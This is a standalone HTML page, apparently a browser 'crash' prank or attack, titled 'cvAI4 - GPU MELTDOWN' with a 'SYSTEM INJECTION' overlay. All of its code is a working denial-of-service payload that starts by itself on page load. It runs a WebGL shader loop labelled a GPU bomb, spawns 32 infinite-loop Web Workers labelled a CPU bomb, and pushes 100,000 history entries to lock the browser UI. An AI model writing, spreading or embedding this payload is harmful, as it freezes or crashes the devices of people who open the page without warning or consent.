<!DOCTYPE html>
<html>
<head>
    <title>cvAI4 - GPU MELTDOWN</title>
    <meta charset="UTF-8">
    <style>
        body, html { margin: 0; padding: 0; width: 100%; height: 100%; overflow: hidden; background: #000; }
        canvas { width: 100%; height: 100%; display: block; }
        .overlay { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); color: red; font-family: monospace; z-index: 10; pointer-events: none; text-align: center; }
    </style>
</head>
<body>
    <div class="overlay"><h1>cvAI4 SYSTEM INJECTION</h1><p>GPU_LOAD: 100%</p></div>
    <canvas id="canvas"></canvas>

    <script id="vs" type="x-shader/x-vertex">
        attribute vec3 position;
        void main() { gl_Position = vec4(position, 1.0); }
    </script>

    <script id="fs" type="x-shader/x-fragment">
        precision highp float;
        uniform float time;
        uniform vec2 resolution;

        // CZNULL KERNEL LOGIC (Volume Shader)
        float kernel(vec3 ver){
            float x, y, z;
            x = cos(1.0 / (ver.x * ver.x + 0.06));
            y = cos(1.0 / (ver.y * ver.y + 0.06));
            z = cos(1.0 / (ver.z * ver.z + 0.06));
            return -x - y - z - 1.2;
        }

        void main() {
            vec2 p = (gl_FragCoord.xy * 2.0 - resolution) / min(resolution.x, resolution.y);
            vec3 v = vec3(p, sin(time));
            float f = kernel(v);
            gl_FragColor = vec4(vec3(f * 0.5, f * 0.2, f), 1.0);
        }
    </script>

    <script>
        // 1. GPU BOMB (Shader Implementation)
        const canvas = document.getElementById('canvas');
        const gl = canvas.getContext('webgl');
        
        function initShader() {
            const vs = gl.createShader(gl.VERTEX_SHADER);
            gl.shaderSource(vs, document.getElementById('vs').text);
            gl.compileShader(vs);
            
            const fs = gl.createShader(gl.FRAGMENT_SHADER);
            gl.shaderSource(fs, document.getElementById('fs').text);
            gl.compileShader(fs);
            
            const program = gl.createProgram();
            gl.attachShader(program, vs);
            gl.attachShader(program, fs);
            gl.linkProgram(program);
            gl.useProgram(program);

            const buffer = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
            gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,1,0, -1,-1,0, 1,1,0, 1,-1,0]), gl.STATIC_DRAW);
            
            const pos = gl.getAttribLocation(program, 'position');
            gl.enableVertexAttribArray(pos);
            gl.vertexAttribPointer(pos, 3, gl.FLOAT, false, 0, 0);

            const timeLoc = gl.getUniformLocation(program, 'time');
            const resLoc = gl.getUniformLocation(program, 'resolution');

            function render(t) {
                gl.uniform1f(timeLoc, t * 0.005);
                gl.uniform2f(resLoc, canvas.width, canvas.height);
                gl.drawArrays(gl.TRIANGLE_STRIP, 0, 4);
                requestAnimationFrame(render);
            }
            requestAnimationFrame(render);
        }

        // 2. CZNULL HISTORY FLOOD (UI Lock)
        function historyFlood() {
            let s = "";
            for(let i=0; i<100000; i++) { s += i; history.pushState(0,0,s); }
        }

        // 3. cvAI4 CPU WORKER BOMB (Multi-thread Lock)
        function cpuKill() {
            for(let i=0; i<32; i++) {
                new Worker(URL.createObjectURL(new Blob(["while(true){}"])));
            }
        }

        window.onload = () => {
            canvas.width = window.innerWidth;
            canvas.height = window.innerHeight;
            initShader(); // Start GPU Attack
            cpuKill();    // Start CPU Attack
            setTimeout(historyFlood, 1000); // Start UI Lock
        };
    </script>
</body>
</html>
